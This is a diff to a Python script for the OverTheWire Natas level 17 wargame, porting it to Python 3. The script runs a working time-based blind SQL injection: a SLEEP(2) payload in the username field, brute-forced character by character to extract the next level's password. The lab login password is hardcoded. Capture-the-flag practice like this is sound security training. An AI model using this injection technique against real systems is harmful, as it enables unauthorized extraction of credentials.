@@ -1,6 +1,6 @@
 import requests
 import re
-from string import * 
+import string
 from time import *
 
 usn = 'natas17'
@@ -8,8 +8,8 @@ url = 'http://%s.natas.labs.overthewire.org/' % usn
 password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
 login = (usn, password)
 
-alphaNum = lowercase + uppercase + digits
-confirmedPass = list()
+alpha_num = string.ascii_letters + string.digits
+confirmed_pass = list()
 session = requests.Session()
 
 #sessionGet = session.get(url, auth=login )
@@ -19,18 +19,19 @@ session = requests.Session()
 
 
 #########################################
-while (len(confirmedPass) < 32):
-  for ch in alphaNum:
+
+while (len(confirmed_pass) < 32):
+  for ch in alpha_num:
     start_time = time()
-    #print "Attempting: ", "".join(confirmedPass) + ch
-    sessionPost = session.post(url, data = {"username" : 'natas18" AND BINARY password LIKE "' + "".join(confirmedPass) + ch +'%" AND SLEEP(2) # '}, auth = login)
-    pageContent = sessionPost.text
+    #print("Attempting: ", "".join(confirmedPass) + ch)
+    session_post = session.post(url, data = {"username" : 'natas18" AND BINARY password LIKE "' + "".join(confirmed_pass) + ch +'%" AND SLEEP(2) # '}, auth = login) ## BINARY LIKE for case sensitivity
+    page_content = session_post.text
     end_time = time()
     duration = end_time - start_time
    
 
     if(duration > 2):
-      confirmedPass.append(ch)
-      print("Password = " + "".join(confirmedPass))
+      confirmed_pass.append(ch)
+      print("Password = " + "".join(confirmed_pass))
       break;
     
